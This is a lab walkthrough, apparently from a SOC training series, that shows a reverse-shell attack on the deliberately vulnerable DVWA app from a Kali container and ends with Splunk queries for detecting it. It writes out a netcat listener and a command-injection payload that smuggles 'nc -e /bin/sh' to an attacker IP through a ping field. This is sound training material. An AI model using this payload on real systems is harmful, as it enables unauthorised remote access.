# Attack Simulation 3: The Reverse Shell (The Holy Grail)

This is what hackers really want. A "Command Prompt" on the victim's server that they control from their own machine.
We will use **Command Injection** on DVWA to force the web server to connect a cable BACK to us (Kali).

## Step 1: Set up the Listener (Kali)
We need to wait for the connection.
1.  **Jump into Kali**:
    ```bash
    docker exec -it kali /bin/bash
    ```
2.  **Find your IP**:
    We need to tell the victim where to call.
    ```bash
    ip addr show eth0
    ```
    *   *Copy the IP address* (e.g., `172.18.0.2`).
3.  **Start Netcat Listener**:
    ```bash
    nc -lvnp 4444
    ```
    *   `-l`: Listen
    *   `-v`: Verbose (show me details)
    *   `-n`: No DNS (faster)
    *   `-p`: Port 4444
    *   *Result*: It should hang waiting for a connection...

## Step 2: Deliver the Payload (DVWA Web)
1.  Go to **DVWA** in your browser (`http://<IP>:80/`).
2.  Ensure Security Level is **Low** (DVWA Security tab).
3.  Go to **Command Injection**.
4.  **The Vulnerability**:
    *   This box expects an IP to "Ping".
    *   Enter `8.8.8.8` -> It pings Google.
    *   Enter `8.8.8.8; ls` -> It pings Google AND lists files. (We have Code Execution!).
5.  **The Exploit**:
    *   Enter this payload (Replace `<KALI_IP>` with the one you copied in Step 1):
        ```text
        127.0.0.1; nc -e /bin/sh <KALI_IP> 4444
        ```
    *   Click **Submit**.
    *   *The page might hang. That is GOOD.*

## Step 3: "I'm In" (Kali)
Go back to your Kali terminal.
1.  Did the screen change?
2.  Does it say `connect to [172.18.0.2] from ...`?
3.  **Test your power**:
    Type `whoami`
    *(It should say `www-data`)*.
    Type `ls`
    *(You are browsing the victim's files!)*.

## Step 4: Detection (Splunk)
This attack leaves a VERY loud trail.
1.  **Search for the Command Injection**:
    ```splunk
    index=soc_lab tag=dvwa "nc" OR "/bin/sh"
    ```
2.  **Search for the Network Connection**:
    ```splunk
    index=soc_lab dest_port=4444
    ```
